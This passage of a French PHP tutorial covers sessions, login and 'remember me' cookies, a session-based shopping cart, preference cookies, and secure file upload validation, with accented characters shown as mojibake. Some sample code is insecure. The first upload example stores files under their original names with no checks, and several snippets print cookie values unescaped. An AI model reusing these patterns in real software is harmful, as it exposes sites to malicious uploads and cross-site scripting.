    <p>Imaginez que vous allez dans un magasin : le vendeur vous reconna√Æt, se souvient de vos pr√©f√©rences et de votre panier d'achat. Sur le web, c'est pareil ! Les <strong>sessions</strong> et <strong>cookies</strong> permettent √† votre site de "se souvenir" des utilisateurs entre les pages et les visites.</p>

    <p><strong>La diff√©rence principale :</strong></p>
    <ul>
        <li>üç™ <strong>Cookies</strong> : Stock√©s sur l'ordinateur de l'utilisateur (comme une carte de fid√©lit√©)</li>
        <li>üìù <strong>Sessions</strong> : Stock√©es sur le serveur (comme un dossier client)</li>
    </ul>

    <h3>15.1 Les sessions - M√©moire temporaire du serveur</h3>
    
    <p>Une <strong>session</strong> est comme un casier temporaire sur le serveur o√π vous stockez des informations sp√©cifiques √† chaque utilisateur pendant sa visite.</p>

    <h4>D√©marrer une session :</h4>
    <pre><code>&lt;?php
// TOUJOURS appeler session_start() en premier !
// (avant tout contenu HTML)
session_start();

// Maintenant on peut utiliser $_SESSION
$_SESSION['nom_utilisateur'] = 'Jean Dupont';
$_SESSION['user_id'] = 123;
$_SESSION['role'] = 'admin';

echo "Session d√©marr√©e pour : " . $_SESSION['nom_utilisateur'];
?&gt;</code></pre>

    <h4>Lire et modifier les donn√©es de session :</h4>
    <pre><code>&lt;?php
session_start();

// V√©rifier si l'utilisateur est connect√©
if (isset($_SESSION['user_id'])) {
    echo "Bonjour " . $_SESSION['nom_utilisateur'] . " !";
    
    // Modifier des donn√©es de session
    $_SESSION['derniere_page'] = 'accueil.php';
    $_SESSION['nombre_visites'] = ($_SESSION['nombre_visites'] ?? 0) + 1;
    
    echo "Nombre de pages visit√©es : " . $_SESSION['nombre_visites'];
} else {
    echo "Vous n'√™tes pas connect√©.";
    echo "&lt;a href='connexion.php'&gt;Se connecter&lt;/a&gt;";
}
?&gt;</code></pre>

    <h4>Syst√®me de connexion complet :</h4>
    <pre><code>&lt;?php
// connexion.php
session_start();
require_once 'config.php';

// Si d√©j√† connect√©, rediriger
if (isset($_SESSION['user_id'])) {
    header('Location: dashboard.php');
    exit;
}

$messageErreur = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';
    
    if (!empty($email) && !empty($password)) {
        $pdo = connecterDB();
        
        $sql = "SELECT id, nom, prenom, email, password_hash, role 
                FROM utilisateurs 
                WHERE email = :email AND actif = 1";
        
        $stmt = $pdo-&gt;prepare($sql);
        $stmt-&gt;execute([':email' =&gt; $email]);
        $utilisateur = $stmt-&gt;fetch();
        
        if ($utilisateur && password_verify($password, $utilisateur['password_hash'])) {
            // Connexion r√©ussie - Cr√©er la session
            $_SESSION['user_id'] = $utilisateur['id'];
            $_SESSION['nom_complet'] = $utilisateur['prenom'] . ' ' . $utilisateur['nom'];
            $_SESSION['email'] = $utilisateur['email'];
            $_SESSION['role'] = $utilisateur['role'];
            $_SESSION['connexion_timestamp'] = time();
            
            // Rediriger vers le tableau de bord
            header('Location: dashboard.php');
            exit;
        } else {
            $messageErreur = "Email ou mot de passe incorrect.";
        }
    } else {
        $messageErreur = "Veuillez remplir tous les champs.";
    }
}
?&gt;

&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Connexion&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h2&gt;üîê Connexion&lt;/h2&gt;
    
    &lt;?php if ($messageErreur): ?&gt;
        &lt;div style="background: #f8d7da; padding: 10px; border-radius: 5px; margin: 10px 0;"&gt;
            ‚ùå &lt;?= htmlspecialchars($messageErreur) ?&gt;
        &lt;/div&gt;
    &lt;?php endif; ?&gt;
    
    &lt;form method="POST"&gt;
        &lt;div&gt;
            &lt;label for="email"&gt;Email :&lt;/label&gt;
            &lt;input type="email" id="email" name="email" required value="&lt;?= htmlspecialchars($_POST['email'] ?? '') ?&gt;"&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label for="password"&gt;Mot de passe :&lt;/label&gt;
            &lt;input type="password" id="password" name="password" required&gt;
        &lt;/div&gt;
        
        &lt;button type="submit"&gt;Se connecter&lt;/button&gt;
    &lt;/form&gt;
    
    &lt;p&gt;&lt;a href="inscription.php"&gt;Pas encore de compte ? S'inscrire&lt;/a&gt;&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>

    <h4>D√©connexion et destruction de session :</h4>
    <pre><code>&lt;?php
// deconnexion.php
session_start();

// D√©truire toutes les donn√©es de session
session_unset();

// D√©truire la session
session_destroy();

// Rediriger vers la page d'accueil
header('Location: index.php');
exit;
?&gt;</code></pre>

    <h3>15.2 Protection des pages avec les sessions</h3>
    
    <h4>Fonction de v√©rification d'authentification :</h4>
    <pre><code>&lt;?php
// auth.php - Fichier √† inclure dans les pages prot√©g√©es
function verifierConnexion($roleRequis = null) {
    session_start();
    
    // V√©rifier si l'utilisateur est connect√©
    if (!isset($_SESSION['user_id'])) {
        header('Location: connexion.php');
        exit;
    }
    
    // V√©rifier le r√¥le si sp√©cifi√©
    if ($roleRequis && $_SESSION['role'] !== $roleRequis) {
        die("Acc√®s refus√© : permissions insuffisantes.");
    }
    
    // V√©rifier que la session n'est pas trop ancienne (24h)
    if (isset($_SESSION['connexion_timestamp'])) {
        $tempsEcoule = time() - $_SESSION['connexion_timestamp'];
        if ($tempsEcoule &gt; 86400) { // 24 heures
            session_destroy();
            header('Location: connexion.php?message=session_expiree');
            exit;
        }
    }
    
    return $_SESSION;
}

function obtenirUtilisateurConnecte() {
    if (isset($_SESSION['user_id'])) {
        return [
            'id' =&gt; $_SESSION['user_id'],
            'nom' =&gt; $_SESSION['nom_complet'],
            'email' =&gt; $_SESSION['email'],
            'role' =&gt; $_SESSION['role']
        ];
    }
    return null;
}
?&gt;</code></pre>

    <h4>Page prot√©g√©e :</h4>
    <pre><code>&lt;?php
// dashboard.php
require_once 'auth.php';

// V√©rifier que l'utilisateur est connect√©
$utilisateur = verifierConnexion();
?&gt;

&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Tableau de bord&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;üè† Tableau de bord&lt;/h1&gt;
    
    &lt;div style="background: #d4edda; padding: 15px; border-radius: 5px; margin: 15px 0;"&gt;
        &lt;h3&gt;Bienvenue &lt;?= htmlspecialchars($utilisateur['nom_complet']) ?&gt; !&lt;/h3&gt;
        &lt;p&gt;Email : &lt;?= htmlspecialchars($utilisateur['email']) ?&gt;&lt;/p&gt;
        &lt;p&gt;R√¥le : &lt;?= htmlspecialchars($utilisateur['role']) ?&gt;&lt;/p&gt;
        &lt;p&gt;Connect√© depuis : &lt;?= date('d/m/Y H:i', $_SESSION['connexion_timestamp']) ?&gt;&lt;/p&gt;
    &lt;/div&gt;
    
    &lt;nav&gt;
        &lt;a href="profil.php"&gt;Mon profil&lt;/a&gt; | 
        &lt;a href="commandes.php"&gt;Mes commandes&lt;/a&gt; | 
        &lt;?php if ($utilisateur['role'] === 'admin'): ?&gt;
            &lt;a href="admin.php"&gt;Administration&lt;/a&gt; | 
        &lt;?php endif; ?&gt;
        &lt;a href="deconnexion.php"&gt;Se d√©connecter&lt;/a&gt;
    &lt;/nav&gt;
    
    &lt;h2&gt;Vos statistiques&lt;/h2&gt;
    &lt;p&gt;Pages visit√©es cette session : &lt;?= $_SESSION['nombre_visites'] ?? 1 ?&gt;&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>

    <h3>15.3 Les cookies - M√©moire persistante</h3>
    
    <p>Les <strong>cookies</strong> sont de petits fichiers stock√©s sur l'ordinateur de l'utilisateur. Ils persistent m√™me apr√®s fermeture du navigateur.</p>

    <h4>Cr√©er des cookies :</h4>
    <pre><code>&lt;?php
// Cr√©er un cookie simple (expire dans 30 jours)
setcookie('nom_utilisateur', 'Jean', time() + (30 * 24 * 60 * 60));

// Cookie avec options de s√©curit√©
setcookie('preferences', 'theme_sombre', [
    'expires' =&gt; time() + (365 * 24 * 60 * 60), // 1 an
    'path' =&gt; '/',                              // Disponible sur tout le site
    'domain' =&gt; 'monsite.com',                  // Domaine
    'secure' =&gt; true,                          // Seulement HTTPS
    'httponly' =&gt; true,                        // Pas accessible en JavaScript
    'samesite' =&gt; 'Strict'                     // Protection CSRF
]);

// Lire un cookie
if (isset($_COOKIE['nom_utilisateur'])) {
    echo "Bonjour " . $_COOKIE['nom_utilisateur'] . " !";
}

// Supprimer un cookie (d√©finir une date pass√©e)
setcookie('nom_utilisateur', '', time() - 3600);
?&gt;</code></pre>

    <h4>Syst√®me "Se souvenir de moi" :</h4>
    <pre><code>&lt;?php
// connexion_avec_cookie.php
session_start();

// V√©rifier s'il y a un cookie "se souvenir"
if (!isset($_SESSION['user_id']) && isset($_COOKIE['remember_token'])) {
    $pdo = connecterDB();
    
    $sql = "SELECT u.id, u.nom, u.prenom, u.email, u.role 
            FROM utilisateurs u 
            JOIN remember_tokens rt ON u.id = rt.user_id 
            WHERE rt.token = :token AND rt.expires_at &gt; NOW()";
    
    $stmt = $pdo-&gt;prepare($sql);
    $stmt-&gt;execute([':token' =&gt; $_COOKIE['remember_token']]);
    $utilisateur = $stmt-&gt;fetch();
    
    if ($utilisateur) {
        // Reconnecter automatiquement
        $_SESSION['user_id'] = $utilisateur['id'];
        $_SESSION['nom_complet'] = $utilisateur['prenom'] . ' ' . $utilisateur['nom'];
        $_SESSION['email'] = $utilisateur['email'];
        $_SESSION['role'] = $utilisateur['role'];
        $_SESSION['connexion_timestamp'] = time();
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';
    $seSouvenir = isset($_POST['remember_me']);
    
    // ... v√©rification du login ...
    
    if ($connexionReussie) {
        // Cr√©er la session normale
        $_SESSION['user_id'] = $utilisateur['id'];
        // ... autres donn√©es de session ...
        
        // Si "se souvenir de moi" est coch√©
        if ($seSouvenir) {
            $token = bin2hex(random_bytes(32));
            $expires = date('Y-m-d H:i:s', time() + (30 * 24 * 60 * 60)); // 30 jours
            
            // Sauvegarder le token en base
            $sql = "INSERT INTO remember_tokens (user_id, token, expires_at) 
                    VALUES (:user_id, :token, :expires) 
                    ON DUPLICATE KEY UPDATE token = :token, expires_at = :expires";
            
            $stmt = $pdo-&gt;prepare($sql);
            $stmt-&gt;execute([
                ':user_id' =&gt; $utilisateur['id'],
                ':token' =&gt; $token,
                ':expires' =&gt; $expires
            ]);
            
            // Cr√©er le cookie
            setcookie('remember_token', $token, [
                'expires' =&gt; time() + (30 * 24 * 60 * 60),
                'path' =&gt; '/',
                'httponly' =&gt; true,
                'secure' =&gt; true,
                'samesite' =&gt; 'Strict'
            ]);
        }
        
        header('Location: dashboard.php');
        exit;
    }
}
?&gt;</code></pre>

    <h3>15.4 Panier d'achat avec sessions</h3>
    
    <h4>Classe de gestion du panier :</h4>
    <pre><code>&lt;?php
// Panier.php
class Panier {
    public function __construct() {
        session_start();
        if (!isset($_SESSION['panier'])) {
            $_SESSION['panier'] = [];
        }
    }
    
    public function ajouter($produitId, $quantite = 1) {
        $produitId = (int)$produitId;
        $quantite = (int)$quantite;
        
        if ($quantite &lt;= 0) return false;
        
        if (isset($_SESSION['panier'][$produitId])) {
            $_SESSION['panier'][$produitId] += $quantite;
        } else {
            $_SESSION['panier'][$produitId] = $quantite;
        }
        
        return true;
    }
    
    public function modifier($produitId, $quantite) {
        $produitId = (int)$produitId;
        $quantite = (int)$quantite;
        
        if ($quantite &lt;= 0) {
            $this-&gt;supprimer($produitId);
        } else {
            $_SESSION['panier'][$produitId] = $quantite;
        }
    }
    
    public function supprimer($produitId) {
        $produitId = (int)$produitId;
        unset($_SESSION['panier'][$produitId]);
    }
    
    public function vider() {
        $_SESSION['panier'] = [];
    }
    
    public function obtenirContenu() {
        return $_SESSION['panier'];
    }
    
    public function nombreArticles() {
        return array_sum($_SESSION['panier']);
    }
    
    public function estVide() {
        return empty($_SESSION['panier']);
    }
    
    public function calculerTotal($pdo) {
        if ($this-&gt;estVide()) return 0;
        
        $ids = array_keys($_SESSION['panier']);
        $placeholders = str_repeat('?,', count($ids) - 1) . '?';
        
        $sql = "SELECT id, nom, prix FROM produits WHERE id IN ($placeholders)";
        $stmt = $pdo-&gt;prepare($sql);
        $stmt-&gt;execute($ids);
        $produits = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);
        
        $total = 0;
        $details = [];
        
        foreach ($produits as $produit) {
            $quantite = $_SESSION['panier'][$produit['id']];
            $sousTotal = $produit['prix'] * $quantite;
            $total += $sousTotal;
            
            $details[] = [
                'produit' =&gt; $produit,
                'quantite' =&gt; $quantite,
                'sous_total' =&gt; $sousTotal
            ];
        }
        
        return [
            'total' =&gt; $total,
            'details' =&gt; $details
        ];
    }
}

// Utilisation du panier
$panier = new Panier();

// Ajouter un produit
if (isset($_POST['ajouter_panier'])) {
    $produitId = $_POST['produit_id'];
    $quantite = $_POST['quantite'] ?? 1;
    
    if ($panier-&gt;ajouter($produitId, $quantite)) {
        echo "‚úÖ Produit ajout√© au panier !";
    }
}

// Afficher le contenu du panier
echo "&lt;h3&gt;üõí Mon panier (" . $panier-&gt;nombreArticles() . " articles)&lt;/h3&gt;";

if (!$panier-&gt;estVide()) {
    $pdo = connecterDB();
    $infoPanier = $panier-&gt;calculerTotal($pdo);
    
    foreach ($infoPanier['details'] as $item) {
        echo "&lt;div&gt;";
        echo $item['produit']['nom'] . " x " . $item['quantite'];
        echo " = " . number_format($item['sous_total'], 2) . "‚Ç¨";
        echo "&lt;/div&gt;";
    }
    
    echo "&lt;p&gt;&lt;strong&gt;Total : " . number_format($infoPanier['total'], 2) . "‚Ç¨&lt;/strong&gt;&lt;/p&gt;";
} else {
    echo "&lt;p&gt;Votre panier est vide.&lt;/p&gt;";
}
?&gt;</code></pre>

    <h3>15.5 Gestion des pr√©f√©rences utilisateur</h3>
    
    <pre><code>&lt;?php
// preferences.php
class PreferencesUtilisateur {
    
    public function sauvegarderPreference($cle, $valeur, $dureeJours = 365) {
        setcookie("pref_$cle", $valeur, [
            'expires' =&gt; time() + ($dureeJours * 24 * 60 * 60),
            'path' =&gt; '/',
            'httponly' =&gt; true,
            'secure' =&gt; isset($_SERVER['HTTPS']),
            'samesite' =&gt; 'Lax'
        ]);
    }
    
    public function obtenirPreference($cle, $defaut = null) {
        return $_COOKIE["pref_$cle"] ?? $defaut;
    }
    
    public function supprimerPreference($cle) {
        setcookie("pref_$cle", '', time() - 3600);
    }
    
    public function appliquerTheme() {
        $theme = $this-&gt;obtenirPreference('theme', 'clair');
        
        if ($theme === 'sombre') {
            echo "&lt;style&gt;
                body { background: #2d3748; color: #e2e8f0; }
                .card { background: #4a5568; border-color: #718096; }
            &lt;/style&gt;";
        }
    }
    
    public function obtenirLangue() {
        // Priorit√© : 1. Cookie, 2. Session, 3. Navigateur, 4. D√©faut
        $langue = $this-&gt;obtenirPreference('langue');
        
        if (!$langue && isset($_SESSION['langue'])) {
            $langue = $_SESSION['langue'];
        }
        
        if (!$langue && isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
            $languesNavigateur = explode(',', $_SERVER['HTTP_ACCEPT_LANGUAGE']);
            $langue = substr($languesNavigateur[0], 0, 2);
        }
        
        return in_array($langue, ['fr', 'en', 'es']) ? $langue : 'fr';
    }
}

// Utilisation
$prefs = new PreferencesUtilisateur();

// Traitement des pr√©f√©rences
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['theme'])) {
        $prefs-&gt;sauvegarderPreference('theme', $_POST['theme']);
    }
    
    if (isset($_POST['langue'])) {
        $prefs-&gt;sauvegarderPreference('langue', $_POST['langue']);
        $_SESSION['langue'] = $_POST['langue'];
    }
    
    echo "‚úÖ Pr√©f√©rences sauvegard√©es !";
}

// Appliquer le th√®me
$prefs-&gt;appliquerTheme();
?&gt;

&lt;!DOCTYPE html&gt;
&lt;html lang="&lt;?= $prefs-&gt;obtenirLangue() ?&gt;"&gt;
&lt;head&gt;
    &lt;title&gt;Mes pr√©f√©rences&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h2&gt;‚öôÔ∏è Mes pr√©f√©rences&lt;/h2&gt;
    
    &lt;form method="POST"&gt;
        &lt;div&gt;
            &lt;label&gt;Th√®me :&lt;/label&gt;
            &lt;select name="theme"&gt;
                &lt;option value="clair" &lt;?= $prefs-&gt;obtenirPreference('theme', 'clair') === 'clair' ? 'selected' : '' ?&gt;&gt;Clair&lt;/option&gt;
                &lt;option value="sombre" &lt;?= $prefs-&gt;obtenirPreference('theme') === 'sombre' ? 'selected' : '' ?&gt;&gt;Sombre&lt;/option&gt;
            &lt;/select&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label&gt;Langue :&lt;/label&gt;
            &lt;select name="langue"&gt;
                &lt;option value="fr" &lt;?= $prefs-&gt;obtenirLangue() === 'fr' ? 'selected' : '' ?&gt;&gt;Fran√ßais&lt;/option&gt;
                &lt;option value="en" &lt;?= $prefs-&gt;obtenirLangue() === 'en' ? 'selected' : '' ?&gt;&gt;English&lt;/option&gt;
                &lt;option value="es" &lt;?= $prefs-&gt;obtenirLangue() === 'es' ? 'selected' : '' ?&gt;&gt;Espa√±ol&lt;/option&gt;
            &lt;/select&gt;
        &lt;/div&gt;
        
        &lt;button type="submit"&gt;üíæ Sauvegarder&lt;/button&gt;
    &lt;/form&gt;
    
    &lt;p&gt;Th√®me actuel : &lt;strong&gt;&lt;?= $prefs-&gt;obtenirPreference('theme', 'clair') ?&gt;&lt;/strong&gt;&lt;/p&gt;
    &lt;p&gt;Langue actuelle : &lt;strong&gt;&lt;?= $prefs-&gt;obtenirLangue() ?&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>

    <h3>15.6 Exercice pratique : Site e-commerce avec sessions</h3>
    
    <p><strong>Objectif :</strong> Cr√©er un mini site e-commerce avec authentification, panier et pr√©f√©rences.</p>
    
    <p><strong>Fonctionnalit√©s √† impl√©menter :</strong></p>
    <ol>
        <li>Inscription et connexion avec sessions</li>
        <li>Catalogue de produits</li>
        <li>Syst√®me de panier complet</li>
        <li>Pages prot√©g√©es (profil, commandes)</li>
        <li>Pr√©f√©rences utilisateur (th√®me, langue)</li>
        <li>Fonction "Se souvenir de moi"</li>
        <li>Statistiques de session (pages vues, temps pass√©)</li>
    </ol>

    <details>
        <summary><strong>üí° Voir la structure de solution</strong></summary>
       </details>
       </section>
       <section>
        
<!-- Partie 16: Upload de fichiers en PHP -->
<section class="part16">
    <h2>16. Upload de fichiers en PHP</h2>
    
    <p>L'upload de fichiers est comme permettre √† vos visiteurs de <strong>d√©poser des documents</strong> dans votre bureau num√©rique. Photos de profil, CV, documents administratifs... Cette fonctionnalit√© est essentielle pour de nombreux sites web, mais elle doit √™tre <strong>parfaitement s√©curis√©e</strong> pour √©viter que des pirates y glissent des virus !</p>

    <p>Nous allons apprendre √† g√©rer tous types de fichiers : images, documents, archives... en toute s√©curit√©.</p>

    <h3>16.1 Les bases de l'upload en PHP</h3>
    
    <p>Pour qu'un formulaire HTML puisse envoyer des fichiers, il faut respecter <strong>3 r√®gles importantes</strong> :</p>

    <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <ol>
            <li><strong>M√©thode POST :</strong> <code>method="POST"</code></li>
            <li><strong>Encodage sp√©cial :</strong> <code>enctype="multipart/form-data"</code></li>
            <li><strong>Champ file :</strong> <code>&lt;input type="file"&gt;</code></li>
        </ol>
    </div>

    <h4>Formulaire d'upload simple :</h4>
    <pre><code>&lt;!-- upload_simple.html --&gt;
&lt;form method="POST" action="traiter_upload.php" enctype="multipart/form-data"&gt;
    &lt;div&gt;
        &lt;label for="fichier"&gt;Choisir un fichier :&lt;/label&gt;
        &lt;input type="file" id="fichier" name="fichier" required&gt;
    &lt;/div&gt;
    
    &lt;div&gt;
        &lt;label for="description"&gt;Description :&lt;/label&gt;
        &lt;input type="text" id="description" name="description"&gt;
    &lt;/div&gt;
    
    &lt;button type="submit"&gt;üì§ Envoyer le fichier&lt;/button&gt;
&lt;/form&gt;</code></pre>

    <h4>Traitement de base c√¥t√© PHP :</h4>
    <pre><code>&lt;?php
// traiter_upload.php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['fichier'])) {
    $fichier = $_FILES['fichier'];
    
    // Informations sur le fichier upload√©
    echo "&lt;h3&gt;üìÑ Informations du fichier :&lt;/h3&gt;";
    echo "&lt;p&gt;&lt;strong&gt;Nom original :&lt;/strong&gt; " . $fichier['name'] . "&lt;/p&gt;";
    echo "&lt;p&gt;&lt;strong&gt;Type MIME :&lt;/strong&gt; " . $fichier['type'] . "&lt;/p&gt;";
    echo "&lt;p&gt;&lt;strong&gt;Taille :&lt;/strong&gt; " . number_format($fichier['size'] / 1024, 2) . " Ko&lt;/p&gt;";
    echo "&lt;p&gt;&lt;strong&gt;Fichier temporaire :&lt;/strong&gt; " . $fichier['tmp_name'] . "&lt;/p&gt;";
    echo "&lt;p&gt;&lt;strong&gt;Code d'erreur :&lt;/strong&gt; " . $fichier['error'] . "&lt;/p&gt;";
    
    // V√©rifier qu'il n'y a pas d'erreur
    if ($fichier['error'] === UPLOAD_ERR_OK) {
        echo "&lt;p style='color: green;'&gt;‚úÖ Fichier re√ßu sans erreur !&lt;/p&gt;";
        
        // D√©finir le dossier de destination
        $dossierUpload = 'uploads/';
        if (!is_dir($dossierUpload)) {
            mkdir($dossierUpload, 0755, true);
        }
        
        // D√©placer le fichier temporaire vers sa destination
        $destination = $dossierUpload . $fichier['name'];
        if (move_uploaded_file($fichier['tmp_name'], $destination)) {
            echo "&lt;p style='color: green;'&gt;‚úÖ Fichier sauvegard√© : $destination&lt;/p&gt;";
        } else {
            echo "&lt;p style='color: red;'&gt;‚ùå Erreur lors de la sauvegarde&lt;/p&gt;";
        }
    } else {
        echo "&lt;p style='color: red;'&gt;‚ùå Erreur d'upload : " . $fichier['error'] . "&lt;/p&gt;";
    }
} else {
    echo "&lt;p&gt;Aucun fichier re√ßu.&lt;/p&gt;";
}
?&gt;</code></pre>

    <h3>16.2 Gestion des erreurs d'upload</h3>
    
    <p>PHP nous donne un code d'erreur pour chaque upload. Apprenons √† les d√©coder pour informer correctement nos utilisateurs !</p>

    <h4>Fonction de d√©codage des erreurs :</h4>
    <pre><code>&lt;?php
function obtenirMessageErreur($codeErreur) {
    switch ($codeErreur) {
        case UPLOAD_ERR_OK:
            return "‚úÖ Aucune erreur";
            
        case UPLOAD_ERR_INI_SIZE:
            return "‚ùå Le fichier d√©passe la taille maximale autoris√©e dans php.ini";
            
        case UPLOAD_ERR_FORM_SIZE:
            return "‚ùå Le fichier d√©passe la taille maximale du formulaire";
            
        case UPLOAD_ERR_PARTIAL:
            return "‚ùå Le fichier n'a √©t√© que partiellement upload√©";
            
        case UPLOAD_ERR_NO_FILE:
            return "‚ö†Ô∏è Aucun fichier n'a √©t√© upload√©";
            
        case UPLOAD_ERR_NO_TMP_DIR:
            return "‚ùå Dossier temporaire manquant";
            
        case UPLOAD_ERR_CANT_WRITE:
            return "‚ùå Impossible d'√©crire sur le disque";
            
        case UPLOAD_ERR_EXTENSION:
            return "‚ùå Upload arr√™t√© par une extension PHP";
            
        default:
            return "‚ùå Erreur inconnue";
    }
}

// Utilisation
if (isset($_FILES['fichier'])) {
    $fichier = $_FILES['fichier'];
    $messageErreur = obtenirMessageErreur($fichier['error']);
    echo "&lt;p&gt;$messageErreur&lt;/p&gt;";
}
?&gt;</code></pre>

    <h3>16.3 Validation et s√©curisation compl√®tes</h3>
    
    <p>‚ö†Ô∏è <strong>ATTENTION :</strong> Accepter n'importe quel fichier est <strong>EXTR√äMEMENT DANGEREUX</strong> ! Un pirate pourrait uploader un script malveillant et prendre le contr√¥le de votre serveur.</p>

    <h4>Classe d'upload s√©curis√©e :</h4>
    <pre><code>&lt;?php
class UploadSecurise {
    private $typesAutorises = [
        // Images
        'image/jpeg' =&gt; ['jpg', 'jpeg'],
        'image/png' =&gt; ['png'],
        'image/gif' =&gt; ['gif'],
        'image/webp' =&gt; ['webp'],
        
        // Documents
        'application/pdf' =&gt; ['pdf'],
        'text/plain' =&gt; ['txt'],
        'application/msword' =&gt; ['doc'],
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document' =&gt; ['docx'],
        
        // Archives
        'application/zip' =&gt; ['zip'],
        'application/x-rar-compressed' =&gt; ['rar']
    ];
    
    private $tailleMax = 10485760; // 10 MB
    private $dossierUpload = 'uploads/';
    
    public function __construct($dossierUpload = null, $tailleMax = null) {
        if ($dossierUpload) $this-&gt;dossierUpload = rtrim($dossierUpload, '/') . '/';
        if ($tailleMax) $this-&gt;tailleMax = $tailleMax;
        
        // Cr√©er le dossier si n√©cessaire
        if (!is_dir($this-&gt;dossierUpload)) {
            mkdir($this-&gt;dossierUpload, 0755, true);
        }
    }
    
    public function valider($fichier) {
        $erreurs = [];
        
        // V√©rifier les erreurs d'upload
        if ($fichier['error'] !== UPLOAD_ERR_OK) {
            $erreurs[] = $this-&gt;obtenirMessageErreur($fichier['error']);
            return $erreurs;
        }
        
        // V√©rifier la taille
        if ($fichier['size'] &gt; $this-&gt;tailleMax) {
            $erreurs[] = "Fichier trop volumineux (max: " . 
                        number_format($this-&gt;tailleMax / 1024 / 1024, 1) . " MB)";
        }
        
        if ($fichier['size'] == 0) {
            $erreurs[] = "Le fichier est vide";
        }
        
        // V√©rifier le type MIME
        $typeMime = mime_content_type($fichier['tmp_name']);
        if (!array_key_exists($typeMime, $this-&gt;typesAutorises)) {
            $erreurs[] = "Type de fichier non autoris√© ($typeMime)";
        }
        
        // V√©rifier l'extension
        $extension = strtolower(pathinfo($fichier['name'], PATHINFO_EXTENSION));
        if (!in_array($extension, $this-&gt;typesAutorises[$typeMime] ?? [])) {
            $erreurs[] = "Extension de fichier non autoris√©e ($extension)";
        }
        
        // V√©rifications sp√©cifiques aux images
        if (strpos($typeMime, 'image/') === 0) {
            $infoImage = getimagesize($fichier['tmp_name']);
            if ($infoImage === false) {
                $erreurs[] = "Le fichier n'est pas une image valide";
            } else {
                // V√©rifier les dimensions
                if ($infoImage[0] &gt; 5000 || $infoImage[1] &gt; 5000) {
                    $erreurs[] = "Image trop grande (max: 5000x5000 pixels)";
                }
            }
        }
        
        // V√©rifier le nom de fichier
        if (!$this-&gt;validerNomFichier($fichier['name'])) {
            $erreurs[] = "Nom de fichier invalide";
        }
        
        return $erreurs;
    }
    
    public function uploader($fichier, $nouveauNom = null) {
        // Valider d'abord
        $erreurs = $this-&gt;valider($fichier);
        if (!empty($erreurs)) {
            return ['succes' =&gt; false, 'erreurs' =&gt; $erreurs];
        }
        
        // G√©n√©rer un nom s√©curis√©
        if ($nouveauNom) {
            $nomFichier = $this-&gt;securiserNom($nouveauNom);
        } else {
            $extension = strtolower(pathinfo($fichier['name'], PATHINFO_EXTENSION));
            $nomFichier = uniqid() . '_' . time() . '.' . $extension;
        }
        
        $cheminComplet = $this-&gt;dossierUpload . $nomFichier;
        
        // D√©placer le fichier
        if (move_uploaded_file($fichier['tmp_name'], $cheminComplet)) {
            return [
                'succes' =&gt; true,
                'nom_fichier' =&gt; $nomFichier,
                'chemin_complet' =&gt; $cheminComplet,
                'taille' =&gt; $fichier['size'],
                'type' =&gt; mime_content_type($cheminComplet)
            ];
        } else {
            return ['succes' =&gt; false, 'erreurs' =&gt; ['Erreur lors de la sauvegarde']];
        }
    }
    
    private function validerNomFichier($nom) {
        // Caract√®res interdits dans les noms de fichiers
        $caracteresInterdits = ['/', '\\', ':', '*', '?', '"', '&lt;', '&gt;', '|'];
        
        foreach ($caracteresInterdits as $caractere) {
            if (strpos($nom, $caractere) !== false) {
                return false;
            }
        }
        
        // Noms de fichiers interdits sous Windows
        $nomsInterdits = ['CON', 'PRN', 'AUX', 'NUL', 'COM1', 'COM2', 'LPT1', 'LPT2'];
        $nomSansExtension = pathinfo($nom, PATHINFO_FILENAME);
        
        return !in_array(strtoupper($nomSansExtension), $nomsInterdits);
    }
    
    private function securiserNom($nom) {
        // Supprimer les caract√®res dangereux
        $nom = preg_replace('/[^a-zA-Z0-9._-]/', '_', $nom);
        
        // √âviter les noms trop longs
        if (strlen($nom) &gt; 100) {
            $extension = pathinfo($nom, PATHINFO_EXTENSION);
            $nom = substr($nom, 0, 100 - strlen($extension) - 1) . '.' . $extension;
        }
        
        return $nom;
    }
    
    private function obtenirMessageErreur($codeErreur) {
        $messages = [
            UPLOAD_ERR_OK =&gt; "Aucune erreur",
            UPLOAD_ERR_INI_SIZE =&gt; "Fichier trop volumineux (limite serveur)",
            UPLOAD_ERR_FORM_SIZE =&gt; "Fichier trop volumineux (limite formulaire)",
            UPLOAD_ERR_PARTIAL =&gt; "Upload incomplet",
            UPLOAD_ERR_NO_FILE =&gt; "Aucun fichier s√©lectionn√©",
            UPLOAD_ERR_NO_TMP_DIR =&gt; "Dossier temporaire manquant",
            UPLOAD_ERR_CANT_WRITE =&gt; "Erreur d'√©criture disque",
            UPLOAD_ERR_EXTENSION =&gt; "Upload bloqu√© par une extension"
        ];
        
        return $messages[$codeErreur] ?? "Erreur inconnue";
    }
}
?&gt;</code></pre>

    <h3>16.4 Upload d'images avec redimensionnement</h3>
    
    <p>Pour les images, on veut souvent cr√©er des <strong>miniatures</strong> ou redimensionner automatiquement pour √©conomiser l'espace disque.</p>

    <h4>Classe de traitement d'images :</h4>
    <pre><code>&lt;?php
class TraitementImage extends UploadSecurise {
    
    public function redimensionner($cheminSource, $cheminDestination, $largeurMax, $hauteurMax = null) {
